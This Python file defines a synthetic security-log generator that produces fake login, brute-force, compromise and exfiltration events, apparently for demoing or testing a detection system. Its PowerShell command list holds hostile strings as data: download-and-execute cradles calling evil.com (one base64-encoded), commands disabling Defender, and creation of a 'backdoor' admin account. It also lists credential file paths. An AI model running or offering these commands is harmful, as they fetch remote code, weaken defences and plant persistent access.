"""Demo log generator for synthetic security events."""

from datetime import datetime, timedelta
from typing import List, Optional
import random
import uuid

from ..core.schemas import (
    SecurityEvent, EventSource, EventType, Action
)
from ..core.config import Config, DEFAULT_CONFIG


class LogGenerator:
    """Generates realistic synthetic security events for testing and demos."""
    
    # Common users, devices, IPs for realistic data
    USERS = ["admin", "john.doe", "jane.smith", "svc_backup", "svc_monitor", "developer", "analyst", "guest"]
    DEVICES = ["SERVER-01", "SERVER-02", "WORKSTATION-01", "WORKSTATION-02", "DC-01", "DB-01", "WEB-01", "APP-01"]
    INTERNAL_IPS = ["10.0.0.{}".format(i) for i in range(1, 255)]
    EXTERNAL_IPS = [f"185.20.30.{i}" for i in range(1, 51)]
    SENSITIVE_FILES = [
        "C:\\Users\\admin\\Documents\\passwords.xlsx",
        "C:\\Database\\customers.db",
        "C:\\Secrets\\api_keys.json",
        "C:\\HR\\salaries.xlsx",
        "C:\\Finance\\payroll.csv",
        "/etc/shadow",
        "/home/user/.ssh/id_rsa",
        "/var/www/html/config.php",
    ]
    POWERSHELL_COMMANDS = [
        "Get-Process", "Get-Service", "Get-EventLog -LogName Security",
        "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Add-MpPreference -ExclusionPath 'C:\\Temp'",
        "Get-LocalUser | Where-Object {$_.Name -eq 'admin'} | Set-LocalUser -PasswordNeverExpires $true",
        "New-LocalUser -Name 'backdoor' -Password (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force) -FullName 'Backdoor Account'",
        "Add-LocalGroupMember -Group 'Administrators' -Member 'backdoor'",
    ]
    
    def __init__(self, config=None, seed=None):
        self.config = config or Config()
        self.random = random.Random(seed)
        self._event_counter = 0
    
    def _next_id(self) -> str:
        self._event_counter += 1
        return f"evt-{self._event_counter:06d}"
    
    def _random_timestamp(self, base: datetime, offset_minutes: tuple) -> datetime:
        """Generate random timestamp within offset range from base."""
        minutes = self.random.randint(offset_minutes[0], offset_minutes[1])
        return base + timedelta(minutes=minutes)
    
    def _random_external_ip(self) -> str:
        return self.random.choice(self.EXTERNAL_IPS)
    
    def _random_internal_ip(self) -> str:
        return self.random.choice(self.INTERNAL_IPS)
    
    def _random_user(self) -> str:
        return self.random.choice(self.USERS)
    
    def _random_device(self) -> str:
        return self.random.choice(self.DEVICES)
    
    def generate_normal_activity(self, count: int = 100, base_time: Optional[datetime] = None) -> List[SecurityEvent]:
        """Generate normal daily activity events."""
        base = base_time or datetime.now()
        events = []
        
        for _ in range(count):
            event_type = self.random.choice([
                EventType.SUCCESSFUL_LOGIN,
                EventType.LOGOUT,
                EventType.CONNECTION,
                EventType.API_REQUEST,
                EventType.FILE_ACCESS,
                EventType.PROCESS_EXECUTION,
            ])
            
            source = {
                EventType.SUCCESSFUL_LOGIN: EventSource.AUTHENTICATION,
                EventType.LOGOUT: EventSource.AUTHENTICATION,
                EventType.CONNECTION: EventSource.NETWORK,
                EventType.API_REQUEST: EventSource.APPLICATION,
                EventType.FILE_ACCESS: EventSource.ENDPOINT,
                EventType.PROCESS_EXECUTION: EventSource.ENDPOINT,
            }[event_type]
            
            user = self._random_user()
            device = self._random_device()
            
            if event_type in [EventType.SUCCESSFUL_LOGIN, EventType.LOGOUT]:
                events.append(SecurityEvent(
                    timestamp=self._random_timestamp(base, (0, 1440)),
                    source=source,
                    event_type=event_type,
                    user=user,
                    source_ip=self._random_internal_ip() if event_type == EventType.SUCCESSFUL_LOGIN else None,
                    device=device,
                    action=Action.LOGIN_SUCCESS if event_type == EventType.SUCCESSFUL_LOGIN else Action.LOGOUT,
                    is_demo=True,
                ))
            elif event_type == EventType.CONNECTION:
                events.append(SecurityEvent(
                    timestamp=self._random_timestamp(base, (0, 1440)),
                    source=source,
                    event_type=event_type,
                    user=user,
                    source_ip=self._random_internal_ip(),
                    destination_ip=self._random_internal_ip(),
                    device=device,
                    port=self.random.choice([80, 443, 22, 3389, 445]),
                    protocol=self.random.choice(["TCP", "UDP"]),
                    action=Action.ALLOW,
                    metadata={"bytes_sent": self.random.randint(100, 10000), "bytes_received": self.random.randint(100, 50000)},
                    is_demo=True,
                ))
            elif event_type == EventType.API_REQUEST:
                events.append(SecurityEvent(
                    timestamp=self._random_timestamp(base, (0, 1440)),
                    source=source,
                    event_type=event_type,
                    user=user,
                    source_ip=self._random_internal_ip(),
                    device=device,
                    action=Action.ALLOW,
                    metadata={"endpoint": f"/api/v1/{self.random.choice(['users', 'orders', 'products', 'reports'])}", "method": "GET", "status_code": 200},
                    is_demo=True,
                ))
            elif event_type == EventType.FILE_ACCESS:
                events.append(SecurityEvent(
                    timestamp=self._random_timestamp(base, (0, 1440)),
                    source=source,
                    event_type=event_type,
                    user=user,
                    device=device,
                    action=self.random.choice([Action.READ, Action.WRITE]),
                    metadata={"file_path": f"C:\\Users\\{user}\\Documents\\{self.random.choice(['report.docx', 'data.xlsx', 'notes.txt'])}", "size": self.random.randint(1000, 1000000)},
                    is_demo=True,
                ))
            elif event_type == EventType.PROCESS_EXECUTION:
                events.append(SecurityEvent(
                    timestamp=self._random_timestamp(base, (0, 1440)),
                    source=source,
                    event_type=event_type,
                    user=user,
                    device=device,
                    action=Action.EXECUTE,
                    metadata={"process_name": self.random.choice(["notepad.exe", "excel.exe", "chrome.exe", "code.exe", "outlook.exe"]), "pid": self.random.randint(1000, 9999)},
                    is_demo=True,
                ))
        
        return sorted(events, key=lambda e: e.timestamp)
    
    def generate_brute_force(self, base_time: Optional[datetime] = None) -> List[SecurityEvent]:
        """Generate brute force attack scenario."""
        base = base_time or datetime.now()
        events = []
        attacker_ip = self._random_external_ip()
        target_user = self.random.choice(["admin", "administrator", "root", "svc_backup"])
        target_device = self.random.choice(["SERVER-01", "DC-01", "WEB-01"])
        
        # 15-20 failed login attempts
        failed_count = 17
        for i in range(failed_count):
            events.append(SecurityEvent(
                timestamp=base + timedelta(seconds=i * 30),
                source=EventSource.AUTHENTICATION,
                event_type=EventType.FAILED_LOGIN,
                user=target_user,
                source_ip=attacker_ip,
                device=target_device,
                action=Action.LOGIN_FAILED,
                metadata={"failure_reason": "invalid_password", "attempt_number": i + 1},
                is_demo=True,
            ))
        
        # Successful login after brute force
        events.append(SecurityEvent(
            timestamp=base + timedelta(seconds=failed_count * 30),
            source=EventSource.AUTHENTICATION,
            event_type=EventType.SUCCESSFUL_LOGIN,
            user=target_user,
            source_ip=attacker_ip,
            device=target_device,
            action=Action.LOGIN_SUCCESS,
            metadata={"session_id": str(uuid.uuid4())},
            is_demo=True,
        ))
        
        return sorted(events, key=lambda e: e.timestamp)
    
    def generate_account_compromise(self, base_time: Optional[datetime] = None) -> List[SecurityEvent]:
        """Generate account compromise scenario."""
        base = base_time or datetime.now()
        events = []
        attacker_ip = self._random_external_ip()
        victim_user = self.random.choice(["john.doe", "jane.smith", "developer", "analyst"])
        victim_device = self._random_device()
        
        unusual_time = base.replace(hour=3, minute=self.random.randint(0, 59))
        # Normal login from usual location first
        usual_ip = self._random_internal_ip()
        events.append(SecurityEvent(
            timestamp=unusual_time - timedelta(hours=6),
            source=EventSource.AUTHENTICATION,
            event_type=EventType.SUCCESSFUL_LOGIN,
            user=victim_user,
            source_ip=usual_ip,
            device=victim_device,
            action=Action.LOGIN_SUCCESS,
            metadata={"session_id": str(uuid.uuid4())},
            is_demo=True,
        ))
        
        # Suspicious login from new IP at unusual time (e.g., 3 AM)
        events.append(SecurityEvent(
            timestamp=unusual_time,
            source=EventSource.AUTHENTICATION,
            event_type=EventType.SUCCESSFUL_LOGIN,
            user=victim_user,
            source_ip=attacker_ip,
            device=victim_device,
            action=Action.LOGIN_SUCCESS,
            metadata={"session_id": str(uuid.uuid4()), "is_unusual_time": True, "is_new_ip": True},
            is_demo=True,
        ))
        
        # Privilege escalation
        events.append(SecurityEvent(
            timestamp=self._random_timestamp(unusual_time, (5, 30)),
            source=EventSource.AUTHENTICATION,
            event_type=EventType.PRIVILEGE_ESCALATION,
            user=victim_user,
            source_ip=attacker_ip,
            device=victim_device,
            action=Action.EXECUTE,
            metadata={"privilege_change": "standard_to_admin", "method": "token_manipulation"},
            is_demo=True,
        ))
        
        # Suspicious PowerShell execution
        events.append(SecurityEvent(
            timestamp=self._random_timestamp(unusual_time, (35, 60)),
            source=EventSource.ENDPOINT,
            event_type=EventType.POWERSHELL_EXECUTION,
            user=victim_user,
            device=victim_device,
            action=Action.EXECUTE,
            metadata={"command": self.random.choice(self.POWERSHELL_COMMANDS[3:]), "parent_process": "cmd.exe"},
            is_demo=True,
        ))
        
        # Sensitive file access
        events.append(SecurityEvent(
            timestamp=self._random_timestamp(unusual_time, (65, 90)),
            source=EventSource.ENDPOINT,
            event_type=EventType.FILE_ACCESS,
            user=victim_user,
            device=victim_device,
            action=Action.READ,
            metadata={"file_path": self.random.choice(self.SENSITIVE_FILES), "size": self.random.randint(10000, 500000)},
            is_demo=True,
        ))
        
        return sorted(events, key=lambda e: e.timestamp)
    
    def generate_data_exfiltration(self, base_time: Optional[datetime] = None) -> List[SecurityEvent]:
        """Generate data exfiltration scenario."""
        base = base_time or datetime.now()
        events = []
        attacker_ip = self._random_external_ip()
        compromised_user = self.random.choice(["svc_backup", "svc_monitor", "developer"])
        compromised_device = self.random.choice(["DB-01", "SERVER-01", "FILE-01"])
        
        # Initial compromise (successful login)
        events.append(SecurityEvent(
            timestamp=base,
            source=EventSource.AUTHENTICATION,
            event_type=EventType.SUCCESSFUL_LOGIN,
            user=compromised_user,
            source_ip=attacker_ip,
            device=compromised_device,
            action=Action.LOGIN_SUCCESS,
            metadata={"session_id": str(uuid.uuid4())},
            is_demo=True,
        ))
        
        # Sensitive file access
        for i in range(self.random.randint(3, 6)):
            events.append(SecurityEvent(
                timestamp=self._random_timestamp(base, (i * 10, i * 10 + 5)),
                source=EventSource.ENDPOINT,
                event_type=EventType.FILE_ACCESS,
                user=compromised_user,
                device=compromised_device,
                action=Action.READ,
                metadata={"file_path": self.random.choice(self.SENSITIVE_FILES), "size": self.random.randint(500000, 50000000)},
                is_demo=True,
            ))
        
        # Large outbound transfer to unusual destination
        events.append(SecurityEvent(
            timestamp=self._random_timestamp(base, (52, 58)),
            source=EventSource.NETWORK,
            event_type=EventType.DATA_TRANSFER,
            user=compromised_user,
            source_ip=self._random_internal_ip(),
            destination_ip=attacker_ip,
            device=compromised_device,
            port=443,
            protocol="TCP",
            action=Action.TRANSFER,
            metadata={
                "bytes_sent": self.random.randint(150 * 1024 * 1024, 500 * 1024 * 1024),
                "bytes_received": self.random.randint(1000, 10000),
                "duration_seconds": self.random.randint(60, 300),
            },
            is_demo=True,
        ))
        
        return sorted(events, key=lambda e: e.timestamp)
    
    def generate_coordinated_attack(self, base_time: Optional[datetime] = None) -> List[SecurityEvent]:
        """Generate coordinated attack scenario matching the required sequence:
        17 failed login attempts
        → successful login
        → new source IP
        → privilege escalation
        → PowerShell execution
        → sensitive file access
        → large outbound transfer
        """
        base = base_time or datetime.now()
        events = []
        attacker_ip = self._random_external_ip()
        attacker_ip_2 = self.random.choice([ip for ip in self.EXTERNAL_IPS if ip != attacker_ip])
        target_user = "admin"
        target_device = "SERVER-01"
        
        # 1. 17 failed login attempts
        for i in range(17):
            events.append(SecurityEvent(
                timestamp=base + timedelta(minutes=i),
                source=EventSource.AUTHENTICATION,
                event_type=EventType.FAILED_LOGIN,
                user=target_user,
                source_ip=attacker_ip,
                device=target_device,
                action=Action.LOGIN_FAILED,
                metadata={"failure_reason": "invalid_password", "attempt_number": i + 1},
                is_demo=True,
            ))
        
        # 2. Successful login
        events.append(SecurityEvent(
            timestamp=base + timedelta(minutes=17),
            source=EventSource.AUTHENTICATION,
            event_type=EventType.SUCCESSFUL_LOGIN,
            user=target_user,
            source_ip=attacker_ip,
            device=target_device,
            action=Action.LOGIN_SUCCESS,
            metadata={"session_id": str(uuid.uuid4())},
            is_demo=True,
        ))
        
        # 3. New source IP (lateral movement or new attacker)
        events.append(SecurityEvent(
            timestamp=base + timedelta(minutes=20),
            source=EventSource.AUTHENTICATION,
            event_type=EventType.SUCCESSFUL_LOGIN,
            user=target_user,
            source_ip=attacker_ip_2,
            device=target_device,
            action=Action.LOGIN_SUCCESS,
            metadata={"session_id": str(uuid.uuid4()), "is_new_ip": True},
            is_demo=True,
        ))
        
        # 4. Privilege escalation
        events.append(SecurityEvent(
            timestamp=base + timedelta(minutes=25),
            source=EventSource.AUTHENTICATION,
            event_type=EventType.PRIVILEGE_ESCALATION,
            user=target_user,
            source_ip=attacker_ip_2,
            device=target_device,
            action=Action.EXECUTE,
            metadata={"privilege_change": "admin_to_system", "method": "token_impersonation"},
            is_demo=True,
        ))
        
        # 5. PowerShell execution (multiple suspicious commands)
        for i, cmd in enumerate(self.POWERSHELL_COMMANDS[3:6]):
            events.append(SecurityEvent(
                timestamp=base + timedelta(minutes=30 + i * 3),
                source=EventSource.ENDPOINT,
                event_type=EventType.POWERSHELL_EXECUTION,
                user=target_user,
                device=target_device,
                action=Action.EXECUTE,
                metadata={"command": cmd, "parent_process": "cmd.exe", "is_suspicious": True},
                is_demo=True,
            ))
        
        # 6. Sensitive file access
        for i in range(3):
            events.append(SecurityEvent(
                timestamp=base + timedelta(minutes=40 + i * 5),
                source=EventSource.ENDPOINT,
                event_type=EventType.FILE_ACCESS,
                user=target_user,
                device=target_device,
                action=Action.READ,
                metadata={"file_path": self.random.choice(self.SENSITIVE_FILES), "size": self.random.randint(100000, 10000000)},
                is_demo=True,
            ))
        
        # 7. Large outbound transfer
        events.append(SecurityEvent(
            timestamp=base + timedelta(minutes=55),
            source=EventSource.NETWORK,
            event_type=EventType.DATA_TRANSFER,
            user=target_user,
            source_ip=self._random_internal_ip(),
            destination_ip=attacker_ip_2,
            device=target_device,
            port=443,
            protocol="TCP",
            action=Action.TRANSFER,
            metadata={
                "bytes_sent": self.random.randint(200 * 1024 * 1024, 1024 * 1024 * 1024),
                "bytes_received": self.random.randint(1000, 10000),
                "duration_seconds": self.random.randint(120, 600),
            },
            is_demo=True,
        ))
        
        # Additional correlated network activity
        events.append(SecurityEvent(
            timestamp=base + timedelta(minutes=57),
            source=EventSource.FIREWALL,
            event_type=EventType.ALLOWED_CONNECTION,
            user=target_user,
            source_ip=self._random_internal_ip(),
            destination_ip=attacker_ip_2,
            device=target_device,
            port=443,
            protocol="TCP",
            action=Action.ALLOW,
            metadata={"rule": "allow_outbound_https", "bytes": self.random.randint(1000000, 10000000)},
            is_demo=True,
        ))
        
        return sorted(events, key=lambda e: e.timestamp)
    
    def generate_scenario(self, scenario: str, base_time: Optional[datetime] = None, **kwargs) -> List[SecurityEvent]:
        """Generate events for a specific scenario."""
        scenarios = {
            "normal_activity": lambda: self.generate_normal_activity(kwargs.get("count", 100), base_time),
            "brute_force": lambda: self.generate_brute_force(base_time),
            "account_compromise": lambda: self.generate_account_compromise(base_time),
            "data_exfiltration": lambda: self.generate_data_exfiltration(base_time),
            "coordinated_attack": lambda: self.generate_coordinated_attack(base_time),
        }
        
        if scenario not in scenarios:
            raise ValueError(f"Unknown scenario: {scenario}. Available: {list(scenarios.keys())}")
        
        return scenarios[scenario]()
    
    def generate_mixed(self, base_time: Optional[datetime] = None) -> List[SecurityEvent]:
        """Generate a mix of normal and attack events."""
        base = base_time or datetime.now()
        all_events = []
        
        # Normal activity (background noise)
        all_events.extend(self.generate_normal_activity(50, base))
        
        # Add attack scenarios at different times
        attack_base = base + timedelta(hours=2)
        all_events.extend(self.generate_brute_force(attack_base))
        
        attack_base2 = base + timedelta(hours=5)
        all_events.extend(self.generate_account_compromise(attack_base2))
        
        attack_base3 = base + timedelta(hours=8)
        all_events.extend(self.generate_data_exfiltration(attack_base3))
        
        attack_base4 = base + timedelta(hours=12)
        all_events.extend(self.generate_coordinated_attack(attack_base4))
        
        return sorted(all_events, key=lambda e: e.timestamp)
